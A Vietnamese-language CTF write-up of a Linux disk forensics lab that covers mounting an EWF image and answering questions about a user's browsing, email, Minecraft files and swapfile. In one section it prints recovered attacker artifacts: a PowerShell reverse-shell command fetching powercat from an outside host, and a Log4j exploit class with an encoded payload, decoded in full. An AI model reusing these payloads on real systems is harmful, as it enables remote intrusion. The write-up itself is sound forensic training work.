---
title: "MrGamer Lab - Linux Disk Forensics"
date: 2025-07-04 12:00:00 +0700
categories: [CTF, Forensics]
tags: [ewf, disk-forensics, linux, sqlite, minecraft]
image:
  path: /assets/img/posts/MrGamer-Lab/banner.png
  alt: MrGamer Lab
---
## Giới thiệu

**Difficulty**: Medium  
**Category**: Endpoint  
**Tools**: ewfmount, SQLite Browser

Bài lab phân tích ổ đĩa Linux để tìm thông tin về hoạt động của user.

## Kiến thức cơ bản

### `mount` (bình thường)

- Dùng để gắn **một filesystem** (ext4, NTFS, FAT...) từ một thiết bị hoặc file ảnh **thẳng vào** thư mục trên hệ thống.
- Nó chỉ hoạt động nếu bạn đưa cho nó **đúng vị trí filesystem** (tức là offset bắt đầu phân vùng, không phải toàn bộ ổ).

Ví dụ:

```bash
sudo mount -o ro,loop,offset=1050624*512 disk.img /mnt/linux
```

Ở đây `disk.img` là raw image (dd), bên trong có sẵn phân vùng Linux.

### `ewfmount`

- Dùng để **giải nén / mount ảnh đĩa định dạng EWF** (`.E01`, `.E02`...) do EnCase tạo ra.
- `.E01` không phải raw image, mà là **định dạng đặc biệt** (có metadata, checksum, nén, chia file...).
- `mount` bình thường không đọc được `.E01`.
- `ewfmount` sẽ:
    1. Giải mã/giải nén `.E01`
    2. Xuất ra một **thiết bị ảo** dạng raw (ví dụ `/mnt/ewf/ewf1`)
        
        → Cái này **mới giống như file `.dd`** mà mount bình thường hiểu được.

## Mount EWF image

Đầu tiên ta dùng ewfmount để giải nén

```bash
┌──(nqghuy㉿DESKTOP-AJTP5JK)-[~/forensics/temp_extract_dir/Lenovo-Final]
└─$ sudo ewfmount LenovoFinal.E01 /mnt/ewf
ewfmount 20140816
```

Kiểm tra partition table:

```bash
┌──(nqghuy㉿DESKTOP-AJTP5JK)-[~/forensics/temp_extract_dir/Lenovo-Final]
└─$ sudo mmls /mnt/ewf/ewf1
GUID Partition Table (EFI)
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Safety Table
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  Meta      0000000001   0000000001   0000000001   GPT Header
003:  Meta      0000000002   0000000033   0000000032   Partition Table
004:  000       0000002048   0001050623   0001048576   EFI System Partition
005:  001       0001050624   0132122623   0131072000
006:  -------   0132122624   0234441647   0102319024   Unallocated
```

Tính offset:

```bash
┌──(nqghuy㉿DESKTOP-AJTP5JK)-[~/forensics/temp_extract_dir/Lenovo-Final]
└─$ echo "1050624 * 512" | bc
537919488
```

| Slot | Start | End | Length | Description | Ý nghĩa |
| --- | --- | --- | --- | --- | --- |
| 000 | 0 | 0 | 1 | Safety Table | Vùng bảo vệ đầu đĩa (protective MBR/GPT safety), chống phần mềm cũ ghi nhầm. |
| 001 | 0 | 2047 | 2048 | Unallocated | 2048 sector đầu (1 MB) trống hoặc chứa thông tin khởi động. |
| 002 | 1 | 1 | 1 | GPT Header | Header GPT chính ở đầu đĩa. |
| 003 | 2 | 33 | 32 | Partition Table | Bảng phân vùng GPT (Primary Partition Table). |
| 004 | 2048 | 1050623 | 1048576 | EFI System Partition | Phân vùng EFI (dùng để boot UEFI), định dạng FAT32. |
| 005 | 1050624 | 132122623 | 131072000 | (trống trong Description) | Đây là phân vùng dữ liệu chính (có thể là Linux filesystem, NTFS, ext4...). |
| 006 | 132122624 | 234441647 | 102319024 | Unallocated | Phần trống còn lại trên đĩa, chưa phân vùng. |

Mount partition:

```bash
┌──(nqghuy㉿DESKTOP-AJTP5JK)-[~/forensics/temp_extract_dir/Lenovo-Final]
└─$ sudo mkdir /mnt/mrgamer

┌──(nqghuy㉿DESKTOP-AJTP5JK)-[~/forensics/temp_extract_dir/Lenovo-Final]
└─$ sudo mount -o ro,noload,offset=537919488 /mnt/ewf/ewf1 /mnt/mrgamer

┌──(nqghuy㉿DESKTOP-AJTP5JK)-[~/forensics/temp_extract_dir/Lenovo-Final]
└─$ ls /mnt/mrgamer
bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  swapfile  tmp  var
boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   sys       usr
```

## Q1: What is the name of the utility or library for which the user was exploring exploits?

`places.sqlite` → file cơ sở dữ liệu SQLite của **Firefox** hoặc các trình duyệt dùng engine Gecko, chứa:

- Lịch sử duyệt web
- Bookmark
- Metadata duyệt web

`History` → thường là file của **Chrome/Chromium/Edge** (cũng là SQLite DB) chứa:

- Lịch sử duyệt web
- Thời gian truy cập
- URL đã vào

```bash
┌──(nqghuy㉿DESKTOP-AJTP5JK)-[/mnt/mrgamer]
└─$ sudo find ./ \( -name "places.sqlite" -o -name "History" \)
./home/rafael/.thunderbird/vrvcx2qf.default-release/places.sqlite
./home/rafael/snap/firefox/common/.mozilla/firefox/mcrcm1xn.default/places.sqlite
./usr/share/ri/2.7.0/system/IRB/History
./usr/share/perl/5.32.1/CPAN/Meta/History
```

![image.png](/assets/img/posts/MrGamer-Lab/image.png)

Hoặc có thể tìm trong các file trong FTK Imager:

![image.png](/assets/img/posts/MrGamer-Lab/image%202.png)

**Answer**: log4j

## Q2: What is the version ID number of the operating system on the machine?

```bash
┌──(nqghuy㉿DESKTOP-AJTP5JK)-[~/forensics/temp_extract_dir/Lenovo-Final]
└─$ cat /mnt/mrgamer/etc/os-release
PRETTY_NAME="Ubuntu 21.10"
NAME="Ubuntu"
VERSION_ID="21.10"
VERSION="21.10 (Impish Indri)"
VERSION_CODENAME=impish
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=impish
```

**Answer**: 21.10

## Q3: What is the hostname of the computer?

```bash
┌──(nqghuy㉿DESKTOP-AJTP5JK)-[~/forensics/temp_extract_dir/Lenovo-Final]
└─$ cat /mnt/mrgamer/etc/hostname
rshell-lenovo
```

**Answer**: rshell-lenovo

## Q4: What is one anime that the user likes?

![image.png](/assets/img/posts/MrGamer-Lab/image%203.png)

```bash
┌──(nqghuy㉿DESKTOP-AJTP5JK)-[~/forensics/temp_extract_dir/Lenovo-Final]
└─$ grep -r -i 'Attack on titan' /mnt/mrgamer/home/rafael
grep: /mnt/mrgamer/home/rafael/.thunderbird/vrvcx2qf.default-release/global-messages-db.sqlite: binary file matches
```

**Answer**: Attack on Titan

## Q5: What is the UUID for the attacker's Minecraft account?

```bash
┌──(nqghuy㉿DESKTOP-AJTP5JK)-[~/forensics/temp_extract_dir/Lenovo-Final]
└─$ jq . /mnt/mrgamer/home/rafael/.minecraft/usercache.json
[
  {
    "name": "n30forever",
    "uuid": "8b0dec19-b463-477e-9548-eef20c861492",
    "expiresOn": "2022-03-05 22:29:17 -0500"
  }
]
```

**Answer**: 8b0dec19-b463-477e-9548-eef20c861492

## Q6: What VPN client did the user install and use on the machine?

```bash
┌──(nqghuy㉿DESKTOP-AJTP5JK)-[~/forensics/temp_extract_dir/Lenovo-Final]
└─$ cat /mnt/mrgamer/home/rafael/.bash_history
curl -s https://install.zerotier.com | sudo bash
```

**Answer**: zerotier

## Q7: What was the user's first password for the guest wifi?

Khi bạn đăng ký dùng **guest Wi-Fi** ở công ty, khách sạn, trường học…, hệ thống quản lý Wi-Fi thường **tự động gửi mật khẩu tạm thời** hoặc link đăng nhập **qua email** mà bạn đã đăng ký.

![image.png](/assets/img/posts/MrGamer-Lab/image%204.png)

```bash
┌──(nqghuy㉿DESKTOP-AJTP5JK)-[~/forensics/temp_extract_dir/Lenovo-Final]
└─$ grep -i password /mnt/mrgamer/home/rafael/.thunderbird/vrvcx2qf.default-release/ImapMail/imap.gmail.com/INBOX
        – Password: 679670
        – Password: 661776
        – Password: 093483
```

![image.png](/assets/img/posts/MrGamer-Lab/image%205.png)

**Answer**: 093483

## Q8: The user watched a video that premiered on Dec 11th, 2021. How many views did it have when they watched it on February 9th?

Xem các file .png trong thư mục screenshots.

## Q9: What is the new channel name for the YouTuber whose cookbook is shown on the device?

![image.png](/assets/img/posts/MrGamer-Lab/image%206.png)

## Q10: What is the module with the highest installed version for the chat application with the mascot Wumpus?

![image.png](/assets/img/posts/MrGamer-Lab/image%207.png)

## Q11: According to Windows, what was the temperature in Fahrenheit on February 11th, 2022, at 6:30 PM?

Có thể là ảnh từ máy tính nạn nhân nên ta sẽ phân tích thư mục `marshalsec`

![image.png](/assets/img/posts/MrGamer-Lab/image%208.png)

![image.png](/assets/img/posts/MrGamer-Lab/image%209.png)

## Q12: What is the upload date of the second youtube video on the channel from which the user downloaded a youtube video?

Rick roll related.

## Q13: What is the SHA-1 hash of Minecraft's "latest" release according to the system?

```bash
┌──(nqghuy㉿DESKTOP-AJTP5JK)-[~/forensics/temp_extract_dir/Lenovo-Final]
└─$ jq . /mnt/mrgamer/home/rafael/.minecraft/versions/version_manifest_v2.json | head
{
  "latest": {
    "release": "1.18.1",
    "snapshot": "22w06a"
  },
  "versions": [
    {
      "id": "22w06a",
      "type": "snapshot",
      "url": "https://launchermeta.mojang.com/v1/packages/3c6e119c0ff307accf31b596f9cd47ffa2ec6305/22w06a.json",
```

## Q14: What were the three flags and their values that were passed to powercat?

```bash
┌──(nqghuy㉿DESKTOP-AJTP5JK)-[~/forensics/temp_extract_dir/Lenovo-Final]
└─$ sudo strings -a -td -el /mnt/mrgamer/swapfile | grep 'powercat' -B 5 -A 5
2103253640 powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.191.253:8000/powercat.ps1');powercat -c 192.168.191.253 -p 4444 -e cmd"
```

- **Swapfile** (hoặc swap partition) là vùng trên đĩa mà hệ điều hành dùng làm bộ nhớ ảo khi RAM đầy hoặc khi cần lưu tạm dữ liệu từ RAM xuống đĩa.
- Trong điều tra số (**digital forensics**), khi RAM không còn dump nguyên vẹn, việc quét **swapfile** giúp khôi phục dấu vết lệnh đã chạy.

Hoặc:

```bash
┌──(nqghuy㉿DESKTOP-AJTP5JK)-[~/forensics/temp_extract_dir/Lenovo-Final]
└─$ cat /mnt/mrgamer/home/rafael/marshalsec/poc/Log4jRCE.java
public class Log4jRCE {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("powershell.exe -exec bypass -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIASQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAOQAxAC4AMgA1ADMAOgA4ADAAMAAwAC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADEAOQAxAC4AMgA1ADMAIAAtAHAAIAA0ADQANAA0ACAALQBlACAAYwBtAGQAIgA=").waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

┌──(nqghuy㉿DESKTOP-AJTP5JK)-[~/forensics/temp_extract_dir/Lenovo-Final]
└─$ echo cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIASQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAOQAxAC4AMgA1ADMAOgA4ADAAMAAwAC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADEAOQAxAC4AMgA1ADMAIAAtAHAAIAA0ADQANAA0ACAALQBlACAAYwBtAGQAIgA= | base64 -d
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.191.253:8000/powercat.ps1');powercat -c 192.168.191.253 -p 4444 -e cmd"
```

**Answer**: -c 192.168.191.253 -p 4444 -e cmd

## Q15: How many dimensions (including the overworld) did the player travel to in the "oldest of the worlds"?

Phân tích world saves trong Minecraft.

## Q16: What is the mojangClientToken stored in the Keystore?

```bash
┌──(nqghuy㉿DESKTOP-AJTP5JK)-[~/forensics/temp_extract_dir/Lenovo-Final]
└─$ sudo find /mnt/mrgamer/home/rafael -name "*.keystore"
/mnt/mrgamer/home/rafael/.local/share/keyrings/user.keystore

┌──(nqghuy㉿DESKTOP-AJTP5JK)-[~/forensics/temp_extract_dir/Lenovo-Final]
└─$ cp /mnt/mrgamer/home/rafael/.local/share/keyrings/user.keystore ~/.local/share/keyrings/
```

Copy vào `~/.local/share/keyrings` rồi reboot, chạy `seahorse` để xem.

## Tham khảo

- [ewftools Documentation](https://github.com/libyal/libewf)
